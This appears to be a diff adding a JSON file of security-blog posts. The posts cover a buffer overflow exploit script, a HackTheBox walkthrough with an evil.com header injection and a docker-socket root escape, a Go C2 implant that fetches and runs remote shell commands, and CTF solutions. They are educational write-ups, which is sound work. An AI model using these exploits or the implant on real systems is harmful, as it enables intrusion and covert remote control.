@@ -1,0 +1,135 @@
+[
+  {
+    "id": "post-001",
+    "title": "Exploiting Buffer Overflows: A Deep Dive into Stack Smashing",
+    "excerpt": "A comprehensive guide to understanding and exploiting classic stack-based buffer overflow vulnerabilities in x86/x64 Linux binaries.",
+    "content": "## Introduction\n\nBuffer overflow vulnerabilities have been around since the early days of computing, yet they remain one of the most fascinating attack vectors in binary exploitation. In this post, we will explore the mechanics of stack-based buffer overflows from first principles.\n\n## What is a Buffer Overflow?\n\nA buffer overflow occurs when a program writes more data to a buffer than it can hold, causing the extra data to overwrite adjacent memory.\n\n```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable(char *input) {\n    char buffer[64];\n    strcpy(buffer, input);  // No bounds check!\n    printf(\"You entered: %s\\n\", buffer);\n}\n\nint main(int argc, char *argv[]) {\n    vulnerable(argv[1]);\n    return 0;\n}\n```\n\n## Stack Layout\n\nWhen `vulnerable()` is called, the stack looks like this:\n\n```\nHigh Address\n+-----------------+\n|   Return Addr   |  <- Target for overwrite\n+-----------------+\n|   Saved RBP     |\n+-----------------+\n|   buffer[64]    |  <- Our input goes here\n+-----------------+\n|   ...           |\nLow Address\n```\n\n## Exploitation\n\nTo exploit this, we need to:\n1. Find the offset to the return address\n2. Craft our payload\n3. Redirect execution\n\n```python\nfrom pwn import *\n\nTARGET = \"./vulnerable\"\np = process(TARGET)\n\noffset = 72  # 64 byte buffer + 8 bytes saved RBP\nret_addr = 0xdeadbeef\n\npayload = b\"A\" * offset\npayload += p64(ret_addr)\n\np.sendline(payload)\np.interactive()\n```\n\n## Mitigations\n\nModern systems employ several protections:\n- **ASLR** — Address Space Layout Randomization\n- **Stack Canaries** — Random value before return address\n- **NX/DEP** — Non-executable stack\n- **PIE** — Position Independent Executables\n\n## Conclusion\n\nUnderstanding buffer overflows at this level is crucial for any security researcher. Next: bypassing these mitigations with ROP chains.",
+    "category": "binary-exploitation",
+    "tags": [
+      "pwn",
+      "binary-exploitation",
+      "bof",
+      "linux",
+      "x86-64"
+    ],
+    "type": "post",
+    "status": "published",
+    "featured": true,
+    "date": "2024-12-15",
+    "readTime": 12,
+    "emoji": "💀",
+    "views": 0
+  },
+  {
+    "id": "post-002",
+    "title": "Web Cache Poisoning to RCE: HackTheBox — Cache Machine",
+    "excerpt": "Full walkthrough of the Cache machine from HackTheBox involving web cache poisoning, SSRF, and privilege escalation via Docker socket abuse.",
+    "content": "## Machine Info\n\n| Field | Value |\n|-------|-------|\n| Name | Cache |\n| OS | Linux |\n| Difficulty | Hard |\n| Points | 40 |\n| Platform | HackTheBox |\n\n## Enumeration\n\nStarting with a standard nmap scan:\n\n```bash\nnmap -sC -sV -oA cache 10.10.10.188\n```\n\n```\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1\n80/tcp open  http    Apache httpd 2.4.29\n```\n\n## Web Cache Poisoning\n\nThe `X-Forwarded-Host` header was reflected without proper sanitization:\n\n```http\nGET / HTTP/1.1\nHost: cache.htb\nX-Forwarded-Host: evil.com\n```\n\nThis allowed cache poisoning and serving malicious content to other users.\n\n## Foothold\n\nPoisoning redirected the admin to our server; captured credentials led to SSH.\n\n```bash\nssh ash@10.10.10.188\n```\n\n## Privilege Escalation\n\nDocker socket was readable:\n\n```bash\nfind / -name \"docker.sock\" 2>/dev/null\ndocker -H unix:///run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt sh\n```\n\n## Root Flag\n\n```\n# [redacted — solve the machine yourself]\n```",
+    "category": "ctf",
+    "tags": [
+      "htb",
+      "web",
+      "cache-poisoning",
+      "docker",
+      "privesc"
+    ],
+    "type": "ctf",
+    "status": "published",
+    "featured": false,
+    "platform": "HackTheBox",
+    "difficulty": "hard",
+    "points": 40,
+    "date": "2024-11-20",
+    "readTime": 18,
+    "emoji": "🏴",
+    "views": 0
+  },
+  {
+    "id": "post-003",
+    "title": "Building a Custom C2 Framework in Go: From Scratch",
+    "excerpt": "Learn how to build a basic Command & Control framework using Go for the implant and Python for the operator console. Educational purposes only.",
+    "content": "## Overview\n\nCommand & Control (C2) frameworks are essential in red team operations. Understanding how they work matters for both offense and defense.\n\n> **Disclaimer**: Educational only. Use only against systems you own or have explicit written permission to test.\n\n## Architecture\n\n```\n[Operator] --HTTP--> [Team Server] --HTTP--> [Implant on Target]\n```\n\n## Implant (Go)\n\n```go\npackage main\n\nimport (\n    \"encoding/json\"\n    \"net/http\"\n    \"os/exec\"\n    \"time\"\n)\n\ntype Task struct {\n    ID      string `json:\"id\"`\n    Command string `json:\"cmd\"`\n}\n\nfunc beacon(server string) {\n    for {\n        resp, _ := http.Get(server + \"/task/\" + getID())\n        var task Task\n        json.NewDecoder(resp.Body).Decode(&task)\n        if task.Command != \"\" {\n            out, _ := exec.Command(\"sh\", \"-c\", task.Command).Output()\n            sendResult(server, task.ID, string(out))\n        }\n        time.Sleep(30 * time.Second)\n    }\n}\n```\n\n## OPSEC Considerations\n\n- Domain fronting to blend with legitimate traffic\n- Jitter in beacon intervals\n- Encrypt all communications (TLS minimum)\n- Malleable C2 profiles\n\n## Detection\n\nBlue teams can watch for:\n- Regular beacon intervals\n- Suspicious SSL certificates\n- Odd DNS patterns\n- Parent-child process anomalies",
+    "category": "tools",
+    "tags": [
+      "c2",
+      "red-team",
+      "go",
+      "malware-dev",
+      "opsec"
+    ],
+    "type": "post",
+    "status": "published",
+    "featured": false,
+    "date": "2024-10-05",
+    "readTime": 22,
+    "emoji": "⚙️",
+    "views": 0
+  },
+  {
+    "id": "post-004",
+    "title": "PicoCTF 2024 — Crypto Challenge: RSA Unpadded Oracle",
+    "excerpt": "Solving a tricky RSA challenge using an unpadded message oracle (blinding) attack to recover plaintext without the private key.",
+    "content": "## Challenge Description\n\nAn RSA oracle decrypts any ciphertext except the target. Classic blinding attack setup.\n\n## Given\n\n```\nn = <2048-bit modulus>\ne = 65537\nc = <target ciphertext>\n```\n\n## Attack: RSA Blinding\n\n1. Choose random `r`\n2. Compute `c_blind = c * r^e mod n`\n3. Submit `c_blind` → get `m_blind = m * r mod n`\n4. Recover `m = m_blind * inverse(r, n) mod n`\n\n## Python Exploit\n\n```python\nfrom Crypto.Util.number import *\nimport requests\n\nn = int(open(\"n.txt\").read())\ne = 65537\nc = int(open(\"c.txt\").read())\n\nr = getRandomRange(2, n - 1)\nc_blind = (c * pow(r, e, n)) % n\n\nresponse = requests.post(URL, data={\"c\": c_blind})\nm_blind = int(response.text)\n\nm = (m_blind * inverse(r, n)) % n\nprint(long_to_bytes(m))\n```\n\n## Flag\n\n```\n# [redacted — solve the challenge yourself]\n```",
+    "category": "ctf",
+    "tags": [
+      "pico",
+      "crypto",
+      "rsa",
+      "oracle-attack"
+    ],
+    "type": "ctf",
+    "status": "published",
+    "featured": false,
+    "platform": "PicoCTF",
+    "difficulty": "medium",
+    "points": 500,
+    "date": "2024-09-10",
+    "readTime": 8,
+    "emoji": "🔐",
+    "views": 0
+  },
+  {
+    "id": "post-005",
+    "title": "React2Shell: Hunting RCE in Next.js Server Components",
+    "excerpt": "How CVE-class flaws in React Server Components / Next.js can lead to RCE — and how React2Shell helps defenders find exposed surfaces.",
+    "content": "## Context\n\nModern JavaScript frameworks ship server-side execution paths that look like ordinary UI code. When those paths accept attacker-controlled input without strict validation, the result can be remote code execution.\n\nThis post documents the research mindset behind **React2Shell** — a scanner focused on Next.js / React Server Components attack surface — built for authorized assessments and remediation.\n\n> Educational and defensive use only. Do not scan systems you do not own or have written permission to test.\n\n## Attack Surface\n\nServer Components can deserialize or evaluate payloads that cross trust boundaries:\n\n- Flight / RSC wire formats\n- Server Actions with weak auth\n- Prototype pollution into dangerous sinks\n\n## Scanner Goals\n\n1. Fingerprint Next.js / RSC endpoints\n2. Probe for known-dangerous patterns safely\n3. Produce actionable remediation notes\n\n## Remediation Checklist\n\n- Patch Next.js / React to fixed releases\n- Restrict Server Actions with authz\n- Validate and schema-check all server inputs\n- Monitor for anomalous RSC traffic\n\n## Conclusion\n\nFramework convenience is not a security boundary. Treat Server Components like any other remote interpreter — under the wrong conditions, that is exactly what they become.",
+    "category": "web",
+    "tags": [
+      "web",
+      "nextjs",
+      "rce",
+      "cve",
+      "research"
+    ],
+    "type": "post",
+    "status": "published",
+    "featured": true,
+    "date": "2025-03-12",
+    "readTime": 10,
+    "emoji": "⚡",
+    "views": 0
+  },
+  {
+    "id": "post-006",
+    "title": "TryHackMe — Introductory Linux Privilege Escalation Notes",
+    "excerpt": "A practical writeup-style checklist for Linux privilege escalation: enumeration, SUID, cron, sudo, and kernel pitfalls.",
+    "content": "## Lab Info\n\n| Field | Value |\n|-------|-------|\n| Platform | TryHackMe |\n| Focus | Linux PrivEsc |\n| Difficulty | Easy–Medium |\n\n## Enumeration First\n\nNever escalate blind. Collect:\n\n```bash\nid; whoami; hostname\nuname -a\nsudo -l\nfind / -perm -4000 2>/dev/null\n```\n\n## High-Signal Paths\n\n### SUID binaries\nUnusual SUID owners often lead to GTFOBins primitives.\n\n### Cron jobs\nWritable scripts run as root are free shells.\n\n### sudo misconfigs\n`NOPASSWD` on editors, interpreters, or package managers is game over.\n\n## Methodology Template\n\n1. Enumerate thoroughly\n2. Identify one weak trust boundary\n3. Exploit locally\n4. Stabilize shell\n5. Document for the report\n\n## Closing\n\nPrivilege escalation is pattern recognition. Build your own notes — this writeup is a starting scaffold.",
+    "category": "ctf",
+    "tags": [
+      "thm",
+      "linux",
+      "privesc",
+      "enumeration"
+    ],
+    "type": "ctf",
+    "status": "published",
+    "featured": false,
+    "platform": "TryHackMe",
+    "difficulty": "easy",
+    "points": 20,
+    "date": "2025-01-18",
+    "readTime": 9,
+    "emoji": "🐧",
+    "views": 0
+  }
+]
